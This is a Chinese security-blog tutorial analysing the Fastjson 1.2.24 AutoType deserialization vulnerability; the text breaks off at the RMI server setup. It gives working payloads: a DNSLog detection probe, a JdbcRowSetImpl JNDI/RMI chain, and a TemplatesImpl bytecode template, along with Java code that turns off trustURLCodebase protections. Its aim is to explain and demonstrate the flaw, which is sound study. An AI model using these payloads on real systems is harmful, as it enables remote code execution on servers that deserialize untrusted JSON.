---
title: JAVA框架与组件 FastJSON 漏洞分析
url: https://mp.weixin.qq.com/s/1ZXcoBIn-Qo7G2wMDUh_0g
source: Doonsec's feed
date: 2026-05-03
fetch_date: 2026-05-04T05:31:11.173313
---

# JAVA框架与组件 FastJSON 漏洞分析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Shiamu7mxKIDjZ5FchXRx6bej4XyjWpPg4IH3GaiaRlDcS9icZhtPxgzmItEJyoYtWSUALeHTmZpfYiaOCz0jOqtcGoczbr1ribVV0obvwGeNhmw/0?wx_fmt=jpeg)

# JAVA框架与组件 FastJSON 漏洞分析

原创

成渝Sec
成渝Sec

成渝Sec

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

**点击蓝字 关注我们**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIBvozXRvewWpLUk1XS7aapYCGtYgxIAicHWoNbKoX5AVcodxO99x2UaMiaJkLLTwFGAPShps7My8mXoF8FUzz5gK6asoXxiaXdDwI/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIBJNegpbFtpQyOeezhRSFNpU3qeZKxNoCoA3bCFfgXQjWicLbCMVkbZpkouNhYlA1Yoo9Ec1Dsth8PumNzUxefvLYFvsEd8ryhA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKIDibD8d4eGuNAqj4Q9xDhN7LkiaPhd9ib6AlNRMYupXLxLSK38VWibZn6L2fKz9xDz8IH4FsKwvoaNNeJLpUic2umuNQzKF5UfHeLGQ/640?wx_fmt=png&from=appmsg)

**面试官问题**

![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKIDCrJ4ANtm9faXTn8zdExAh51fVjzTS6icfH5bjLJCgToTu6m4cUlj3XCsqdxm4weFDsCFNC3r3ArwsPzsV5ZPfCM5BatXRDLxs/640?wx_fmt=png&from=appmsg)

Fastjson漏洞利用原理是什么？

Fastjson的 AutoType自动加包机制，可以执行恶意代码，攻击者利用其 JNDI 属性查找到恶意 RMI/LDAP 服务，从而加载并执行远程恶意类，实现 RCE。

**面试官问题**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIAmOgJMAMK4QGPEwHPWmLJ2EhZibsuqlwsArvodevcj3JLlOecwQnN3C3ibticAuoXRMP0wbCEziaLg3DxiaC602cW31g4f6PEsGGPg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKICXOFyAJqkVnJymFX4sWswQBwCpibRWmxLShUCH5Baf30CQXzYhVSuTicg62Hib20YOHHV9mxovv3vBKia53j7d0MrskZWxV2VftVw/640?wx_fmt=png&from=appmsg)

Fastjson漏洞如何发现？

如果Fastjson有 DNSLog 外带记录，就证明了目标存在 Fastjson 漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKIC4QIwc83vbOknS6Wwk92KDR0dDN4lwH44R9tHxib0Jt6zYibbeb1TQRcx2j5jX7zyFTiccnGqy6HIx07tw0s7sccvkx9tblWs8ZI/640?wx_fmt=png&from=appmsg)

Fastjson概述

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIBAiaLdjvvzlDuSPIib52FNHUFRicULqqTQLib0RnaB7dd11KD82iaw9UibjbnYygficRWMK8SBuFB0iaWSkLYvuysd1TA5gr2NibP7WvW0/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKIDGFeq5JR8DwXBJnygS7BUGTrgsm5vQzeQUWdeLkOI9icB6iaqXBVYyLIJ0eENjY2Pv2OF7RaemSsLhP7VFGgUQ7ZIAmqCyJLZWE/640?wx_fmt=png&from=appmsg)

Fasjson是一个由阿里巴巴开发的Java语言编写的开源JSON库，主要用于将Java对象转换为 JSON 字符串，以及将 JSON 字符串转换回 Java 对象。Fastjson 以其高性能和易用性著称，广泛应用于各种 Java 开发场景中。

Fasjison有一个非常好用的特色功能: AutoType，写作: @type。它本意是能够在反序列化时指定类型，从而方便后续的开发操作。这个过程中，反序列化出来的信息是通过 setXXX  方法写入  @type 指定的类中的。

一 Fastjson项目构建

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIAQEwbdhJ2aDcLTIoT2L2GL5ApWtHOxgzP3nShtUW5yMgLibiaohg1z14tySq7Qjd7F47BNXgBP3LdkwXiaHINFScFDib6AsuIUnia4/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKIApLVhE4x0lIttDsAYiaqxiaG4qnhwVFWSxgpA6v0AIXH1g6xJ98pJQpBYsDIBwklOVwB1tVxJqWt2ANnsBDUMpDsJQicsnhob7Xc/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIDFYk54KTWibujcBibjvADVqw1ah8DhkYVytXL1IL6zJXYib2jNBKC9MKE8ofnUdr8P2Rtl7N2BqWb9R1Z9twbQw1vQmsyILsELwo/640?wx_fmt=png&from=appmsg)

引入依赖pom.xml

以下是 Maven 项目配置文件 pom.xml 中的一段依赖声明，用于引入 Fastjson 的 1.2.24 版本：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIBQB4wM3XToFrqRpibTy5t5ndz69U9JZUMib0qmmJFFiaY8ImJbSvX6AicLdBvdNywqoUBUzcF1ibcYsFc9BasZ00oWQXbXncJb0mSY/640?wx_fmt=png&from=appmsg)

程序员相关操作

新建FastJsonApplication文件：

```
package com.yxsec.www;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import java.util.HashMap;/** * @Project : fastjson * @File : FastJsonApplication.java * @Author 张老师 * @Time : 2026/5/3 08:56 * @文件说明 */public class FastJsonApplication {    public static void main(String[] args) {        HashMap<Object, Object> hashMap = new HashMap<>();        hashMap.put("name", "robin");        hashMap.put("age", 18);        hashMap.put("love", "study");        // Java -> JSON        String jsonString = JSON.toJSONString(hashMap);        System.out.println("JSONString: " + jsonString);        // JSON -> Java        JSONObject jsonObject = JSON.parseObject(jsonString);        System.out.println("JSONObject: " + jsonObject);    }}
```

程序运行，输出如下Java -> JSON和JSON -> Java的内容：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIDPZFxCVeiavticUe2dPp7kCHubqG4UYbkvQA48bpgibg5elbzhyWjSlr2Y35giadWXGnRbibNBzCLRM8110icibnNCTWX2HwZeFickE1A/640?wx_fmt=png&from=appmsg)

二 Fastjson漏洞发现

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIDAb5gd6tibwNQGFrm6Un15jytsR1jy75VvymIvAQnPgAET7GTSichsjHSR2KflNgtIecXgydceibJMwCtp5U0iaibqvDqSmGkAzkxU/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIBVfY82Hl2vsg96QBR44FuOAK16xruV09yw9eelfZHZBiaWHHFpvz32OlibMMzZECLkPeiaTDhpeMNsIDNuObarpeNFO1zIXpj7Os/640?wx_fmt=png&from=appmsg)

Fastjson漏洞发现payload：

```
// fastjson 探测 dns外带(检测是否存在fastjson漏洞) 注意换成自己的的dns{"@type":"java.net.InetAddress","val":"test.bpykdsdcq.yutu.eu.org"}
// fastjson 遇见 @ 开头的就会自动加载
```

第一步：利用 Fastjson 的 AutoType 功能：当 Fastjson 解析 JSON 时，遇到 @type 会尝试实例化指定的类。

第二步：DNS 解析触发外带请求：java.net.InetAddress.getByName("test.bpykdsdcq.yutu.eu.org") 方法会被调用，触发 DNS 查询。

第三步：DNSLog 平台记录：test.bpykdsdcq.yutu.eu.org 这个域名指向一个 DNSLog 平台（如 yutu.eu.org），如果目标服务器发起了 DNS 查询，平台就会收到记录。

### Fastjson漏洞代码

修改FastJsonApplication文件：

```
package com.yxsec.www;import com.alibaba.fastjson.JSONObject;/** * @Project : fastjson * @File : FastJsonApplication.java * @Author 张老师 * @Time : 2026/5/3 08:56 * @文件说明 */public class FastJsonApplication {    public static void main(String[] args) {        String payload = "{\"@type\":\"java.net.InetAddress\",\"val\":\"test.krfdktrmiq.zaza.eu.org\"}";        try {            JSONObject.parseObject(payload);        } catch (Exception e) {            System.out.println("Fastjson Error: " + e.toString());        }    }}
```

### DNSLog外带

生成DNSLog外带可用域名：

![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKIDphnkTMvUELeTC5icBiaiaARlaQyGGtsQCb7ATGrxfNibNx7ibfhkZJXQgeeEpicZBrriaNuItKqMYUWE9TibaVINN13h2nAhH0TXH3aA/640?wx_fmt=png&from=appmsg)

刷新，获取DNSLog外带记录：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKICeeZcqp7cO3GfJzEKcdnCCqUqO6qEKjt0w8ica4xhBgic9M70lqR17jMVDiahiaG2DAmFhJcuUVBAJljHic7MWhnPuDMAC7rA7XS9c/640?wx_fmt=png&from=appmsg)

三 Fastjson漏洞利用

![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKIDPlS0zWkkhZk5Ko2whyYpvnaHnjPb29iblchXxVWwG4ccIxbGvRWjdkYmxz9C5m1brSVibNibtU9pM6IRNMVBJUoaGAU2XnjtwLU/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKICR37icCWNSniaLicSF7iaabZPTwLIWEuYfAkaXfiaJGZ5hrEfB1YL5LDdnjqibAUIx4o6OPB5Mo5xGaF6z6GajxgsBXiawUjiaUiaqpvV8/640?wx_fmt=png&from=appmsg)

### FastJson的漏洞利用payload：

```
// fastjson 探测 dns外带(检测是否存在fastjson漏洞) 注意换成自己的的dns{"@type":"java.net.InetAddress","val":"test.bpykdsdcq.yutu.eu.org"}// 以下是fastjson的payload// fastjson JdbcRowSetImpl 利用链恶意代码执行{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:2323/shell","autoCommit":true}// fastjson TemplatesImpl 利用链恶意代码执行 base64版本{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["base64字符串"],"_name":"asb","_tfactory":{},"_outputProperties":{},"_version":"1.0","allowedProtocols":"all"}// fastjson 遇见 @ 开头的就会自动加载
```

### Fastjson漏洞代码

修改FastJsonApplication文件：

```
package com.yxsec.www;import com.alibaba.fastjson.JSONObject;/** * @Project : fastjson * @File : FastJsonApplication.java * @Author 张老师 * @Time : 2026/5/3 08:56 * @文件说明 */public class FastJsonApplication {    public static void main(String[] args) {        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:2323/shell\",\"autoCommit\":true}";        try {            // u121，java超过这个版本要设置参数            System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");            // u221，java超过这个版本要设置参数            System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");            JSONObject.parseObject(payload);        } catch (Exception e) {            System.out.println("Fastjson Error: " + e.toString());        }    }}
```

### RMI服务器准备

同时打开RMI服务器，且运行：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIAjNcM33WdLF3UVpOh0Q2E4sCiaaN6kMzF8z53vjowOAiaDKiaKnx0SSFG2apPJWOqvNMVPdib6CXkYWic5tao37WBNaAnDSia2dpzibM/640?wx_fmt...